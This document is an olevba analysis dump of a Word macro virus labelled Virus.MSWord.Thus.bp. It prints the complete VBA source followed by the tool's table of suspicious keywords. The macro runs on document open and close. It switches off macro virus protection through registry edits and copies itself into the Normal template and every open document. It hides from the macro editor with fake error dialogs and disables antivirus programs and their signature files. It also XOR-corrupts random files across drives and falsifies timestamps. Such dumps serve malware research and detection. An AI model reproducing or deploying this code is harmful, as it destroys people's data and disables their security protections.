olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.bp-403324138daa5ebc7fe242e0a2326e24ae303fea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.bp-403324138daa5ebc7fe242e0a2326e24ae303fea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Thus_001'
'NIST_32abcp2CETp'
Private Type FTM
     dwLowDateTime As Long
     dwHighDateTime As Long
End Type
Private Type STM
     wYear As Integer
     wMonth As Integer
     wDayOfWeek As Integer
     wDay As Integer
     wHour As Integer
     wMinute As Integer
     wSecond As Integer
     wMilliseconds As Integer
End Type
Private Declare Function CF& Lib "kernel32" Alias "CopyFileA" (ByVal _
    lpExistingFileName As String, ByVal lpNewFileName As String, ByVal _
    bFailIfExists As Long)
Private Declare Function CrF& Lib "kernel32" Alias "CreateFileA" (ByVal _
    lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, _
    lpSecurityAttributes As Any, ByVal dwCreationDisposition As _
    Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long)
Private Declare Function GFT& Lib "kernel32" Alias "GetFileTime" (ByVal hFile As Long, _
    lpCreationTime As FTM, lpLastAccessTime As FTM, lpLastWriteTime As _
    FTM)
Private Declare Function SFT& Lib "kernel32" Alias "SetFileTime" (ByVal hFile As Long, _
    lpCreationTime As FTM, lpLastAccessTime As FTM, lpLastWriteTime As _
    FTM)
Private Declare Function FTTST& Lib "kernel32" Alias "FileTimeToSystemTime" (lpFileTime As FTM, _
    lpSystemTime As STM)
Private Declare Function STTFT& Lib "kernel32" Alias "SystemTimeToFileTime" (lpSystemTime As _
    STM, lpFileTime As FTM)
Private Declare Function CHl& Lib "kernel32" Alias "CloseHandle" (ByVal hObject As Long)
Private Declare Function FWBC Lib "user32" _
    Alias "FindWindowA" _
    (ByVal lpClassName As String, ByVal lpWindowName As Long) _
    As Long
Private Declare Function LWU Lib "user32" Alias "LockWindowUpdate" _
    (ByVal hwndLock As Long) As Long
Private Sub Document_Open()
Dim k As Integer, Sd As Boolean, Nt As Boolean
    On Error Resume Next
    Application.ShowVisualBasicEditor = Chr(6048 / 21 / 6)
With Application
2   SUt 0, 1
    .EnableCancelKey = 0
    .DisplayAlerts = 0
If Application.ShowVisualBasicEditor Then GoTo 2
    .Options.VirusProtection = Chr(3696 / 7 / 11)
    .Options.ConfirmConversions = Chr(8976 / 11 / 17)
    .Options.SaveNormalPrompt = Chr(1872 / 3 / 13)
    .Options.SavePropertiesPrompt = Chr(9072 / 9 / 21)
    .Options.DefaultOpenFormat = 1
    .DefaultSaveFormat = ""
    .DisplayStatusBar = Chr(48)
End With
         WordBasic.DisableAutoMacros 0
    If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Nt = -1
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
  If Application.Documents.Count > 0 Then
    For k = 1 To Application.Documents.Count
    If Left(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
    Sd = Application.Documents.Item(k).Saved
    Application.Documents.Item(k).ReadOnlyRecommended = Chr(48)
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If: Randomize
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If Application.Documents.Item(k).SaveFormat > 1 Then
    Application.Documents.Item(k).SaveAs FileFormat:=0, ReadOnlyRecommended:=0
    Else: If (Sd) And (Dir(Application.Documents.Item(k).FullName, 7) <> "") Then Application.Documents.Item(k).Save
    End If
    End If
    Next k
  End If
  If Application.Templates.Count > 0 Then
    For k = 1 To Application.Templates.Count
    If Left(Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 17) <> "'NIST_32abcp2CETp" Then
    Sd = Application.Templates.Item(k).Saved
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Templates.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If (Sd) And (Dir(Application.Templates.Item(k).FullName, 7) <> "") Then Application.Templates.Item(k).Save
    End If
    Next k
  End If
    If Nt Then Exit Sub
DPIO 1
If Application.Documents.Count > 0 Then
Sd = ActiveDocument.Saved
If (Sd = False) And (ActiveDocument.ReadOnly = False) Then
       If Dir(ActiveDocument.FullName, 7) = "" Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=0, ReadOnlyRecommended:=0
       Else: ActiveDocument.Save
       End If
       Sd = ActiveDocument.Saved
       ActiveDocument.Saved = False
End If
If (Sd) And (ActiveDocument.SaveFormat < 2) Then RCy ActiveDocument.FullName, "DOC"
End If
SMHk "File", 23, "FileOpen"
SMHk "File", 3, "FileSave"
SMHk "Tools", 522, "ToolsOptions"
SMHk "Tools", 751, "FileTemplates"
SMHk "Tools", 797, "xxx"
SMHk "Macro", 1695, "ViewVBCode"
SMHk "Macro", 186, "ToolsMacro"
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_Close()
Dim Res As String, X As String
On Error Resume Next
    SUt 0, 1
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = Chr(48)
    Document_Open
    ASD
    Res = RnDr(Chr(Int((Len(GDs()) * Rnd) + 1) + 66) & Chr(58) & Chr(92))
If Res <> "" Then X = RFe(Res, "*.*")
If Len(X) <> 0 Then
    If UCase(Mid(X, Len(X) - 2, 2)) <> "DO" Then
        Res = Res & X
    Else
        Res = ""
    End If
Else
    Res = ""
End If
If Res <> "" Then DFe Res
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_New()
    SUt 0, 1
    Application.EnableCancelKey = 0
    Application.DisplayAlerts = Chr(48)
    Document_Open
    AWd
    SUt -1, 1
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub AutoExec()
    Document_Open
End Sub
Private Sub AutoExit()
    Document_Open
End Sub
Private Sub FileOpen()
On Error Resume Next
With Dialogs(80)
    .Display
If .Name <> "" Then
     SetAttr .Name, 0
    .ReadOnly = Chr(48)
    .ConfirmConversions = 0
    .Execute
End If
End With
End Sub
Private Sub FileSave()
Application.ActiveDocument.Save
    Document_Open
End Sub
Private Sub Auto_Save()
    Document_Open
End Sub
Private Sub ToolsMacro()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub ViewVBCode()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub FileTemplates()
DPIO 1
Document_Open
MsgBox "Global template not loaded", 16
End Sub
Private Sub ToolsOptions()
On Error Resume Next
    Application.Options.VirusProtection = Chr(49)
    Dialogs(974).Show
    Application.Options.VirusProtection = Chr(48)
End Sub
Private Sub DPIO(SaveF As Boolean)
Dim FNum As Integer
Const Param = "dword:0000000"
Const Path = "\Software\Microsoft\Office\"
Dim Ver(1 To 2) As String
Ver(1) = "8.0\"
Ver(2) = "9.0\"
Const NewUse = "New User Settings\"
Const Def = "\.Default"
Const Sec = "Security"
Const Lev = "Level"
Const temp = "c:\~WRL8369.tmp"
Dim Keys(1 To 3) As String
Keys(1) = "HKEY_LOCAL_MACHINE"
Keys(2) = "HKEY_CURRENT_USER"
Keys(3) = "HKEY_USERS"
Dim Dis(1 To 3) As String
Dis(1) = "EnableMacroVirusProtection"
Dis(2) = "Options6"
Dis(3) = "MacroVirusProtection"
Dim AddId(1 To 6) As String
AddId(1) = "Word\Options"
AddId(2) = "Excel\Microsoft Excel"
AddId(3) = "PowerPoint\Options"
AddId(4) = "Word\7.0\Options"
AddId(5) = "Excel\7.0\Microsoft Excel"
AddId(6) = "PowerPoint\7.0\Options"
Dim i As Integer
Dim k As Integer
Dim X As Integer
Dim Use As String
On Error Resume Next
With System
If SaveF Then
Use = .PrivateProfileString("", Keys(2) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "LoadPowerConfig")
If CBool(Len(Use) > 15) Then If CBool(Len(Dir(Right(Use, Len(Use) - 15), 7)) <> 0) Then If CBool(FileLen(Right(Use, Len(Use) - 15)) = 212 * 7) Then SaveF = 0
End If
If SaveF Then
    FNum = FreeFile
  Open temp For Output As #FNum
  Print #FNum, "REGEDIT4"
  Print #FNum, ""
End If
Use = .PrivateProfileString("", Keys(1) & "\System\CurrentControlSet\control", "Current User")
If (Use <> ".Default") Or (SaveF) Then X = 3 Else X = 2
For k = 1 To X
For i = 1 To 3
Select Case k
Case 1
.PrivateProfileString("", Keys(k) & Path & Ver(1) & NewUse & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & NewUse & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Path & Ver(1) & NewUse & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
End If
Case 2
.PrivateProfileString("", Keys(k) & Path & Ver(1) & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Path & Ver(1) & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
 Print #FNum, "[" & Keys(k) & Path & Ver(2) & Choose(i, Left(AddId(i), 5), Left(AddId(i), 6), Left(AddId(i), 11)) & Sec & "]"
 Print #FNum, Chr(34) & Lev & Chr(34) & "=" & Param & Chr(49)
End If
Case 3
.PrivateProfileString("", Keys(k) & Def & Path & Ver(1) & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & Def & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
If SaveF Then
 Print #FNum, "[" & Keys(k) & Def & Path & Ver(1) & AddId(i) & "]"
 Print #FNum, Chr(34) & Dis(i) & Chr(34) & "=" & Chr(34) & Chr(48) & Chr(34)
 Print #FNum, "[" & Keys(k) & Def & Path & Ver(2) & Choose(i, Left(AddId(i), 5), Left(AddId(i), 6), Left(AddId(i), 11)) & Sec & "]"
 Print #FNum, Chr(34) & Lev & Chr(34) & "=" & Param & Chr(49)
End If
End Select
Next i
Next k
If SaveF Then
    Close #FNum
Use = RCy(temp, "DLL")
    Kill temp
If Len(Use) <> 0 Then
.PrivateProfileString("", Keys(2) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "LoadPowerConfig") = "Regedit.exe /s " & Chr(34) & Use & Chr(34)
If X = 3 Then .PrivateProfileString("", Keys(1) & Left(Path, 20) & "Windows\CurrentVersion\" & Chr(82) & Chr(117) & Chr(110), "SystemControl") = "Regedit.exe /s " & Chr(34) & Use & Chr(34)
End If
End If
End With
End Sub
Private Function GDs() As String
Const Rt = ":\"
Dim FileNum As Integer
Dim St As String
Dim i As Byte
On Error Resume Next
    FileNum = FreeFile
    For i = 1 To 24
    St = Chr(66 + i) & Rt & Chr(96)
    Open St For Binary As #FileNum
    Close #FileNum
    Kill St
    If Err = 0 Then GDs = GDs & Chr(66 + i) Else Err.Clear
    Next i
End Function
Private Sub SUt(X As Boolean, AppClass As Byte)
Dim Cls(1 To 4) As String
Cls(1) = "OpusApp"
Cls(2) = "XLMAIN"
Cls(3) = "PP97FrameClass"
Cls(4) = "OMain"
    Dim hwnd As Long
    Dim Ret As Long
On Error Resume Next
    Select Case X
    Case 0
        hwnd = FWBC(Cls(AppClass), 0&)
        Ret = LWU(hwnd)
    Case 1
        Ret = LWU(0&)
    End Select
End Sub
Private Function RCy(Sours As String, Ext As String) As String
Dim Fls As String, DirR As String
Dim k As Long, Er As Integer, A As Integer
On Error GoTo YYY
Do
Fls = GDs
DirR = RnDr(Mid(Fls, Int((Len(Fls) * Rnd) + 1), 1) & Chr(58) & Chr(92))
Fls = RFe(DirR, "*.*")
Er = Er + 1
If Er > 10 Then Exit Function
Loop Until Fls <> ""
k = InStr(1, Fls, ".", 1)
If k <> 0 Then
Fls = Left(Fls, Len(Fls) - (Len(Fls) - k) - 1)
End If
Fls = Fls & "." & Ext
DirR = DirR & Fls
If Dir(DirR, 7) <> "" Then
    A = 1
    Er = GetAttr(DirR)
    SetAttr DirR, 0
End If
RCy = DirR
k = CF&(Sours, DirR, 0)
RTm DirR, 0
If A Then SetAttr DirR, Er
YYY:
End Function
Private Sub DFe(Path As String)
Dim Attr As Integer
Dim Siz As Long, Cmp As Long
Dim FileNum As Integer
Dim i As Integer
Dim Ofs As Byte
On Error GoTo Ends
    Siz = FileLen(Path)
If Siz < 11 Then Exit Sub
    Attr = GetAttr(Path)
    SetAttr Path, 0
    RTm Path, 2
    FileNum = FreeFile
Open Path For Binary As #FileNum
    If Siz < 32763 Then Ofs = 9 Else Ofs = 3
    Get #FileNum, Siz - Ofs, Cmp
If Siz = Cmp Then Exit Sub
    Cmp = Siz
If Siz > 32763 Then Siz = 32763
ReDim Buf(1 To Siz) As Byte
        Rnd (-100)
    Get #FileNum, 10, Buf
    For i = 1 To Siz
    Buf(i) = Buf(i) Xor Int((255 * Rnd) + 0)
    Next i
    Put #FileNum, 10, Buf
        Cmp = Cmp + Ofs
    Put #FileNum, Cmp - Ofs, Cmp
    Close #FileNum
    RTm Path, 1
    SetAttr Path, Attr
Ends:
End Sub
Private Sub ASD()
Const Path1 = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Const Path2 = "\System\CurrentControlSet\Services\VxD\SpIDer"
Const Key = "HKEY_LOCAL_MACHINE"
Const RN = "RUNDLL.EXE"
Dim Ext(1 To 4) As String
Ext(1) = "*.EXE"
Ext(2) = "*.DLL"
Dim Name As String
Dim i As Integer, k As Integer
Dim ProgPath As String
On Error Resume Next
With System
For i = 1 To 4
Select Case i
    Case 1
Name = Chr(83) & Chr(112) & Chr(73) & Chr(68) & Chr(101) & Chr(114)
    Case 2
Name = Chr(65) & Chr(86) & Chr(80) & Chr(67) & Chr(67)
    Case 3
Name = Chr(65) & Chr(86) & Chr(80) & Chr(73)
    Case 4
Name = Chr(65) & Chr(86) & Chr(80) & Chr(67) & Chr(67) & " Service"
End Select
If i = 4 Then
    ProgPath = .PrivateProfileString("", Key & Path1 & "Services", Name)
Else
    ProgPath = .PrivateProfileString("", Key & Path1, Name)
End If
If (ProgPath <> "") And (ProgPath <> RN) Then
If i = 4 Then
.PrivateProfileString("", Key & Path1 & "Services", Name) = RN
Else
.PrivateProfileString("", Key & Path1, Name) = RN
End If
If i = 1 Then .PrivateProfileString("", Key & Path2, "StaticVxD") = "*IOS"
ProgPath = PTD(ProgPath)
For k = 1 To 3
If k = 1 Then Ext(3) = "*.VDB" Else Ext(3) = "*.AVC"
Name = Dir(ProgPath & Ext(k), 7)
Do While Len(Name) <> 0
DFe ProgPath & Name
Name = Dir
Loop
Next k
End If
Next i
End With
End Sub
Private Sub RTm(FName As String, Md As Byte)
Dim hF As Long, i As Byte, Yr As Integer, Mn As Integer, CurYr As Integer
Dim St As STM
Dim DT(1 To 3) As FTM
On Error Resume Next
hF = CrF(FName, &HC0000000, 3&, ByVal 0&, 3&, &H10000080, 0&)
Call GFT(hF, DT(1), DT(2), DT(3))
Select Case Md
    Case 0
Yr = (Year(Now) - 8) + Int((8 * Rnd) + 1)
Mn = St.wMonth = Int((12 * Rnd) + 1)
CurYr = Int((Month(Now) * Rnd) + 1)
For i = 1 To 3
Call FTTST(DT(i), St)
St.wYear = Yr
If St.wYear = Year(Now) Then St.wMonth = CurYr _
Else St.wMonth = Mn
Call STTFT(St, DT(i))
Next i
  Case 1
For i = 1 To 3
DT(i).dwLowDateTime = DT(i).dwLowDateTime + Int((1000 * Rnd) + 10000)
Next i
    Case 2
Call CHl(hF)
Exit Sub
End Select
Call SFT(hF, DT(1), DT(2), DT(3))
Call CHl(hF)
End Sub
Private Function PTD(Path As String) As String
Dim tmp As String
Dim i As Long, k As Long
On Error GoTo Sti
If Path = "" Then GoTo Sti
k = Len(Path)
For i = k To 1 Step -1
    If Mid(Path, i, 1) = "\" Then Exit For
Next i
PTD = Left(Path, i)
Exit Function
Sti:
    PTD = ""
End Function
Private Sub AWd()
Const Key = "HKEY_CLASSES_ROOT"
Dim S As String, i As Byte
Dim Ext(1 To 7) As String
Ext(1) = "wri": Ext(2) = "diz": Ext(3) = "nfo": Ext(4) = "cnt": Ext(5) = "log": Ext(6) = "me": Ext(7) = "1st"
On Error Resume Next
With System
  S = .PrivateProfileString("", Key & "\.doc", "")
 For i = 1 To 7
  .PrivateProfileString("", Key & "\." & Ext(i), "") = S
 Next i
  S = .PrivateProfileString("", Key & "\.wbk", "")
  .PrivateProfileString("", Key & "\.bak", "") = S
End With
End Sub
Private Sub SMHk(CBName As String, CID As Long, ProcName As String)
Dim A As CommandBar, B As CommandBarControl
On Error Resume Next
Set A = CommandBars(CBName)
Set B = A.FindControl(Type:=msoControlButton, ID:=CID)
    If Not B Is Nothing Then If B.OnAction <> ProcName Then B.OnAction = ProcName
For Each A In CommandBars
    Set B = A.FindControl(Type:=msoControlButton, ID:=CID)
    If Not B Is Nothing Then If B.OnAction <> ProcName Then B.OnAction = ProcName
Next A
End Sub
Private Function RDr(ByVal Path As String) As String
Const Maska = "*.*"
Dim Buf As New Collection
Dim FindName As String
If Right(Path, 1) <> "\" Then Path = Path & "\"
On Error GoTo Errs
  FindName = Dir(Path, 23)
  Do While Len(FindName) <> 0
    If (GetAttr(Path & FindName) And vbDirectory) = vbDirectory Then
        If Left(FindName, 1) <> "." Then Buf.Add FindName
    End If
         FindName = Dir
  Loop
        RDr = UCase(Path & Buf(Int((Buf.Count * Rnd) + 1)))
Errs:
        If Buf.Count = 0 Then RDr = ""
End Function
Private Function RnDr(ByVal Path As String) As String
Dim tmp As String
Dim i As Integer
Dim GetRandom As Integer
Dim RandStep As Integer
   GetRandom = Int((1001 * Rnd) + 1)
     RandStep = 0
   For i = 1 To 10
        tmp = RDr(Path)
        If tmp <> "" Then Path = tmp
        If (tmp = "") And (i = 1) Then
              RnDr = ""
              Exit Function
        End If
        If (tmp = "") And (i <> 1) Then
              RnDr = Path & "\"
              Exit Function
        End If
    Select Case RandStep
        Case 0 To 200
            RandStep = RandStep + 200
        Case 400 To 600
            RandStep = RandStep + 100
        Case 700 To 900
            RandStep = RandStep + 50
    End Select
        If RandStep >= GetRandom Then
             RnDr = Path & "\"
             Exit Function
        End If
     Next i
End Function
Private Function RFe(ByVal Path As String, Maska As String) As String
Dim Buf As New Collection
Dim FindName As String
Path = Path & Maska
On Error GoTo Errs
  FindName = Dir(Path, 7)
  Do While Len(FindName) <> 0
        Buf.Add FindName
         FindName = Dir
  Loop
        RFe = UCase(Buf(Int(Buf.Count * Rnd) + 1))
Errs:
        If Buf.Count = 0 Then RFe = ""
End Function
Private Sub xxx()
End Sub





























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBADLG.DLL          |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

